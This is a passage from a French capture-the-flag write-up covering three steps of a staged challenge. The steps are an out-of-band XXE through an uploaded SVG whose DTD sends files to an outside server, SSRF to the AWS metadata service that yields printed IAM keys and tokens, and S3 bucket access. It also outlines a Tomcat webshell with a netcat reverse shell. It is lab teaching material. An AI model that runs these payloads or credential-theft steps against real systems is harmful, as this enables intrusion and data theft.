id=iii2-explication-de-lexploitation>III.2. Explication de l&rsquo;exploitation</h3><p>Par défaut, l&rsquo;URL du <strong>frontend</strong> accepte les images PNG : <code>https://frontend.willywonka.shop/profile?filetype=image%2Fpng</code></p><p>Le mime-type est présent en paramètre GET, alors pour que l&rsquo;application accepte les SVG XML il suffit de le changer : <code>image%2fsvg%2bxml</code></p><p>Une XXE Out-of-band (OOB) est similaire à une XXE &ldquo;classique&rdquo;, ou &ldquo;in-band&rdquo;. Une OOB est une XXE à l&rsquo;aveugle qui va charger un DTD distant. Les entités présentent dans ce DTD seront ensuite exécutées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png, /lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png title=/lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png></p><p>Lors de CTF passés, j&rsquo;ai déjà évoqué les XXE OOB : <a href=https://maki.bzh/walkthrough/santhacklaus2018/#archdrive-4-3 target=_blank rel="noopener noreffer">Santhacklaus 2018</a>. Dans cet article, le même serveur a été utilisé, mais il est aussi possible d&rsquo;utiliser deux instances <a href=https://maki.bzh/stupidthings/dontpayvps/ target=_blank rel="noopener noreffer">ngrok</a>.</p><h3 id=iii3-exploitation>III.3. Exploitation</h3><p>Ci-dessous les fichiers nous permettant de mener à bien l&rsquo;exploitation :</p><ul><li>ro.svg : le SVG XML contenant l&rsquo;appel des entités externes du fichier DTD.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE svg [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % file SYSTEM &#34;http://51.158.113.8/ro.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl>%file;%template;
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;svg</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.w3.org/2000/svg&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;10&#34;</span> <span class=na>y=</span><span class=s>&#34;30&#34;</span><span class=nt>&gt;</span>Injected: <span class=ni>&amp;res;</span><span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/svg&gt;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>ro.dtd : charge contenant les entités permettant de cibler un fichier et d&rsquo;exfiltrer son contenu.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % secret1 SYSTEM &#34;file:///flag.txt&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % template &#34;&lt;!ENTITY res SYSTEM &#39;http://51.158.113.8/?data=%secret1;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></td></tr></table></div></div><p><strong>Note</strong> : l&rsquo;adresse IP utilisée (51.158.113.8) est un VPS temporaire de chez <em>Scaleway</em> avec un <strong>Python SimpleHTTPServer</strong> sur le port 80.</p><p>Lorsque l&rsquo;environnement est correctement configuré, il ne reste qu&rsquo;à uploader la charge via le formulaire sur le <strong>frontend</strong> :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png, /lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png title=/lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png></p><p>En retour, le <strong>frontend</strong> nous renvoie l&rsquo;identifiant du ticket : <em><code>e6afec4a</code></em>. Le bouton <strong>Autoresize</strong> de l&rsquo;application en <strong>backend</strong> appelle le parser XML vulnérable. C&rsquo;est donc à ce moment que la charge est exécutée.</p><p><strong>Note</strong> : on observe de l&rsquo;activité sur les logs du <strong>Python SimpleHTTPServer</strong>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step3_flag.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step3_flag.png, /lib/images/writeups/2019_wonkachallenge/step3_flag.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step3_flag.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step3_flag.png title=/lib/images/writeups/2019_wonkachallenge/step3_flag.png></p><p>Dans ce cas précis, ce n&rsquo;est pas réellement une XXE OOB, car le retour s&rsquo;affiche sur l&rsquo;application (cf. Fig 13 - Ticket côté backend).</p><h3 id=iii4-flag>III.4. Flag</h3><blockquote><p>0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630</p></blockquote><hr><h3 id=resources-1>Resources</h3><ol><li><strong>alexbirsan</strong>, <em>LFI and SSRF via XXE in emblem editor</em>, HackerOne : <a href=https://hackerone.com/reports/347139 target=_blank rel="noopener noreffer">https://hackerone.com/reports/347139</a></li><li><strong>Ian Muscat</strong>, <em>Out-of-band XML External Entity (OOB-XXE)</em>, Acunetix : <a href=https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/ target=_blank rel="noopener noreffer">https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/</a></li></ol><hr><hr><h2 id=iv-step-4---ssrf-to-kfc>IV. Step 4 - SSRF to KFC</h2><blockquote><p>Lets check this bucket !</p></blockquote><h3 id=tldr-3>TL;DR</h3><ol><li>La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l&rsquo;adresse suivante : <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li><li>Les informations du bucket se situent ici : <code>http://169.254.169.254/latest/dynamic/instance-identity/document</code></li><li>Initialiser les variables d&rsquo;environnement avec les informations trouvées pour se connecter : <code>AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN</code></li><li>Lister le contenu du bucket : <code>aws s3 ls s3://willywonka-shop</code></li><li>Récupérer le flag : <code>aws s3 cp s3://willywonka-shop/Flag-04.txt .</code></li></ol><hr><h3 id=iv1-reconnaissance>IV.1. Reconnaissance</h3><p>Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers. Cependant il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier <code>/etc/passwd</code>, afin de récupérer les utilisateurs du système. Parfois, il arrive que le <code>.bash_history</code> de l&rsquo;utilisateur courant soit accessible par tout le monde, c&rsquo;est ce qu&rsquo;il se passe dans notre cas :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>sudo vim flag.txt
</span></span><span class=line><span class=cl>curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
</span></span><span class=line><span class=cl>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/  
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Pour des raisons de lisibilité, j&rsquo;ai tronqué le contenu du fichier pour ne garder que les quelques lignes intéressantes.</p><p>Revenons à notre XXE, jusqu&rsquo;à présent seul le schéma <code>file://</code> a été utilisé. Amazon utilise le schéma <code>http://</code> pour récupérer les informations du bucket S3. Le <code>.bash_history</code> trouvé précédemment nous donne une de ces requêtes : <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/</code></p><h3 id=iv2-exploitation>IV.2. Exploitation</h3><p>En remplaçant <code>file:///flag.txt</code> par <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/</code> dans la charge <strong>ro.dtd</strong>, il est possible de récupérer les informations de connexion.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % secret1 SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % template &#34;&lt;!ENTITY res SYSTEM &#39;http://51.158.113.8/?data=%secret1;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;Code&#34;</span><span class=p>:</span><span class=s2>&#34;Success&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;LastUpdated&#34;</span><span class=p>:</span><span class=s2>&#34;2019-07-10T14:45:25Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;Type&#34;</span><span class=p>:</span><span class=s2>&#34;AWS-HMAC&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;AccessKeyId&#34;</span><span class=p>:</span><span class=s2>&#34;ASIAZ47IG35A4F6ZY2ML&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;SecretAccessKey&#34;</span><span class=p>:</span><span class=s2>&#34;bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;Token&#34;</span><span class=p>:</span><span class=s2>&#34;AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;Expiration&#34;</span><span class=p>:</span><span class=s2>&#34;2019-07-10T20:55:48Z&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Pour accéder au contenu d&rsquo;un bucket S3, il faut différentes informations secrètes, mais aussi la zone du bucket :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % secret1 SYSTEM &#34;http://169.254.169.254/latest/dynamic/instance-identity/document&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % template &#34;&lt;!ENTITY res SYSTEM &#39;http://51.158.113.8/?data=%secret1;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;devpayProductCodes&#34;</span><span class=p>:</span><span class=kc>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;marketplaceProductCodes&#34;</span><span class=p>:</span><span class=kc>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;accountId&#34;</span><span class=p>:</span><span class=s2>&#34;680702435137&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;availabilityZone&#34;</span><span class=p>:</span><span class=s2>&#34;eu-west-3c&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;ramdiskId&#34;</span><span class=p>:</span><span class=kc>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;kernelId&#34;</span><span class=p>:</span><span class=kc>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;pendingTime&#34;</span><span class=p>:</span><span class=s2>&#34;2019-07-04T16:23:26Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;architecture&#34;</span><span class=p>:</span><span class=s2>&#34;x86_64&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;privateIp&#34;</span><span class=p>:</span><span class=s2>&#34;172.31.39.217&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;version&#34;</span><span class=p>:</span><span class=s2>&#34;2017-09-30&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;region&#34;</span><span class=p>:</span><span class=s2>&#34;eu-west-3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;imageId&#34;</span><span class=p>:</span><span class=s2>&#34;ami-0119667e27598718e&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;billingProducts&#34;</span><span class=p>:</span><span class=kc>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;instanceId&#34;</span><span class=p>:</span><span class=s2>&#34;i-0defb90fb5aafe95b&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nt>&#34;instanceType&#34;</span><span class=p>:</span><span class=s2>&#34;t2.medium&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Lorsque toutes ces informations sont réunies, en configurant les différentes variables d&rsquo;environnement, il est possible de se connecter au bucket.</p><h3 id=iv3-connexion-au-bucket-s3>IV.3. Connexion au bucket s3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ <span class=nb>export</span> <span class=nv>AWS_ACCESS_KEY_ID</span><span class=o>=</span>ASIAZ47IG35A57E4JGVL
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ <span class=nb>export</span> <span class=nv>AWS_SECRET_ACCESS_KEY</span><span class=o>=</span>44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ <span class=nb>export</span> <span class=nv>AWS_DEFAULT_REGION</span><span class=o>=</span>eu-west-3
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ <span class=nb>export</span> <span class=nv>AWS_SESSION_TOKEN</span><span class=o>=</span>AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4<span class=o>=</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ aws s3 ls                                      
</span></span><span class=line><span class=cl>2019-07-04 18:41:42 willywonka-shop
</span></span></code></pre></td></tr></table></div></div><p>La connexion étant établie, nous sommes en mesure de récupérer son contenu :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(KaliVM) ➜ aws s3 ls                      
</span></span><span class=line><span class=cl>2019-07-04 18:41:42 willywonka-shop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(KaliVM) ➜ aws s3 ls s3://willywonka-shop/
</span></span><span class=line><span class=cl>                           PRE images/
</span></span><span class=line><span class=cl>                           PRE tools/
</span></span><span class=line><span class=cl>2019-07-05 13:54:47         65 Flag-04.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools      
</span></span><span class=line><span class=cl>                           PRE tools/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/     
</span></span><span class=line><span class=cl>                           PRE docs/
</span></span><span class=line><span class=cl>                           PRE vpn/
</span></span><span class=line><span class=cl>2019-07-05 10:15:18          0 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/docs/
</span></span><span class=line><span class=cl>2019-07-05 13:15:12          0 
</span></span><span class=line><span class=cl>2019-07-05 13:15:32    1140644 MachineAccountQuota is USEFUL Sometimes_ Exploiting One of Active Directory\&#39;s Oddest Settings.pdf
</span></span><span class=line><span class=cl>2019-07-05 13:15:45    1726183 Preventing Mimikatz Attacks – Blue Team – Medium.pdf
</span></span><span class=line><span class=cl>                                
</span></span><span class=line><span class=cl>(KaliVM) ➜ aws s3 cp s3://willywonka-shop/Flag-04.txt .
</span></span><span class=line><span class=cl>download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(KaliVM) ➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn .
</span></span><span class=line><span class=cl>download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal.ovpn
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(KaliVM) ➜ cat Flag-04.txt 
</span></span><span class=line><span class=cl>0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
</span></span></code></pre></td></tr></table></div></div><p>En plus du flag de cette étape, il y a un fichier VPN <code>wonka_internal.ovpn</code> dans le bucket, qui laisse présager un active directory.</p><h3 id=iv5-flag>IV.5. Flag</h3><blockquote><p>0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528</p></blockquote><hr><h3 id=resources-2>Resources</h3><ol><li><strong>@christophetd</strong>, <em>Abusing the AWS metadata service using SSRF vulnerabilities</em>, Blog de Christophe Tafani-Dereeper : <a href=https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/ target=_blank rel="noopener noreffer">https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/</a></li><li><strong>notsosecure team</strong>, <em>Exploiting SSRF in AWS Elastic Beanstalk</em>, notsosecure : <a href=https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/ target=_blank rel="noopener noreffer">https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/</a></li></ol><hr><hr><h2 id=v-step-5---tomcat-and-jerry>V. Step 5 - Tom(cat) and Jerry</h2><blockquote><p>Lets get the flag at the root of your first blood</p></blockquote><h3 id=tldr-4>TL;DR</h3><ol><li>Se connecter au VPN récupéré dans le bucket ;</li><li>Une nouvelle route est apparue : <code>172.16.42.0/24</code> ;</li><li>Effectuer une énumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ;</li><li>Utiliser <code>dirsearch</code> avec une wordlist tomcat (seclist), et trouver la page <code>/host-manager/</code> ;</li><li>Se connecter avec les identifiants <code>tomcat : tomcat</code> ;</li><li>Monter un partage samba nommé <code>data</code> avec un webshell (<strong>cmd.war</strong>) à l&rsquo;intérieur ;</li><li>Déployer le webshell en tant que nouvelle application via les <code>UNC path</code> ;</li><li>Accéder au webshell à l&rsquo;adresse : <code>http://maki-lab:8080/cmd/index.jsp?cmd=whoami</code> ;</li><li>Utiliser <strong>netcat</strong> pour faire un reverse shell.</li></ol><hr><h3 id=v1-reconnaissance>V.1. Reconnaissance</h3><p>Lorsque le tunnel VPN est correctement monté, une nouvelle adresse apparait :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜ ip r <span class=p>|</span> grep tun0
</span></span><span class=line><span class=cl>10.8.0.1 via 10.8.0.17 dev tun0 
</span></span><span class=line><span class=cl>10.8.0.17 dev tun0 proto kernel scope link src 10.8.0.18 
</span></span><span class=line><span class=cl>172.16.42.0/24 via 10.8.0.17 dev tun0 
</span></span></code></pre></td></tr></table></div></div><p>Il existe plusieurs techniques de reconnaissances afin de trouver tous les hôtes de ce réseau:</p><ul><li><strong>Ping scan</strong> : rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ;</li><li><strong>Port scan</strong> : Retenir quelques ports connus et vérifier s&rsquo;ils sont ouverts. Cette méthode est un peu plus lente, mais fonctionne relativement bien.</li></ul><p><strong>Note</strong> : Personnellement je fais un <strong>premier masscan</strong> avec environ 100 ports connus sur l&rsquo;ensemble du réseau, puis un <strong>second masscan</strong> avec l&rsquo;ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, <strong>un nmap</strong> spécifique sur les ports et hôtes trouvés. C&rsquo;est la méthode la plus rapide que j&rsquo;ai pu trouver jusqu&rsquo;à présent.</p><p>CI-dessous le <em>premier masscan</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate <span class=m>1000</span> 172.16.42.0/24
</span></span><span class=line><span class=cl>Discovered open port 445/tcp on 172.16.42.5                                    
</span></span><span class=line><span class=cl>Discovered open port 53/tcp on 172.16.42.5                                     
</span></span><span class=line><span class=cl>Discovered open port 445/tcp on 172.16.42.101                                  
</span></span><span class=line><span class=cl>Discovered open port 445/tcp on 172.16.42.11                                   
</span></span></code></pre></td></tr></table></div></div><p>Avec cette méthode, trois machines ressortent :</p><ul><li>172.16.42.5</li><li>172.16.42.11</li><li>172.16.42.101</li></ul><h4 id=v1a-17216425-dc01-ww2>V.1.a. 172.16.42.5 (DC01-WW2)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
